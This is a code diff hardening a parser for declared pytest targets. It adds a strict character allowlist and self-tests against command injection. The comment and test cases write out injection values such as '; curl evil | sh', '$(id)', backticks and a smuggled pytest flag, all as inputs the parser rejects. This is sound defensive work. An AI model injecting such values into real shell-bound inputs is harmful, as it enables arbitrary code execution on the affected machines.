@@ -52,6 +52,16 @@ FENCE_RE = re.compile(
 )
 ROOT = "tests/experimental/"
 
+# A target is a path, optionally with a ``::selector`` suffix. Anything outside this
+# charset is rejected outright rather than reasoned about: the value reaches a shell,
+# and "starts with tests/experimental/ and has no .." accepts
+# ``tests/experimental/x.py; curl evil | sh``. That is a legal filename, so the
+# existence check is not a reliable backstop either -- it only happens to reject the
+# obvious payloads. Keeping the guarantee explicit means callers can state it.
+TARGET_RE = re.compile(
+    r"^[A-Za-z0-9][A-Za-z0-9._/-]*(::[A-Za-z0-9_][A-Za-z0-9._\[\]-]*)*$"
+)
+
 
 def parse(body: str) -> list[str]:
     """Return declared pytest targets. Raises ValueError with a fixable message."""
@@ -64,17 +74,24 @@ def parse(body: str) -> list[str]:
     if len(blocks) > 1:
         raise ValueError(f"found {len(blocks)} experimental-tests blocks; expected 1")
 
-    targets, bad = [], []
+    targets, bad, unsafe = [], [], []
     for raw in blocks[0].splitlines():
         line = raw.split("#", 1)[0].strip()
         if not line:
             continue
         # A path may carry a ::test suffix; validate only the file part.
         path = line.split("::", 1)[0]
-        if not path.startswith(ROOT) or ".." in path:
+        if not TARGET_RE.match(line):
+            unsafe.append(line)
+        elif not path.startswith(ROOT) or ".." in path:
             bad.append(line)
         else:
             targets.append(line)
+    if unsafe:
+        raise ValueError(
+            "targets contain characters not allowed in a test path: "
+            + ", ".join(unsafe)
+        )
     if bad:
         raise ValueError(f"targets outside {ROOT}: {', '.join(bad)}")
     if not targets:
@@ -131,6 +148,19 @@ def _selftest() -> int:
         (
             "```experimental-tests\ntests/experimental/../gemm/x.py\n```",
             "path traversal",
+        ),
+        (
+            "```experimental-tests\ntests/experimental/a.py; curl evil | sh\n```",
+            "shell metacharacters",
+        ),
+        (
+            "```experimental-tests\ntests/experimental/$(id)\n```",
+            "command substitution",
+        ),
+        ("```experimental-tests\ntests/experimental/`id`\n```", "backticks"),
+        (
+            "```experimental-tests\ntests/experimental/a.py --collect-only\n```",
+            "smuggled pytest flag",
         ),
         (
             "```experimental-tests\ntests/experimental/a.py\n```\n```experimental-tests\ntests/experimental/b.py\n```",
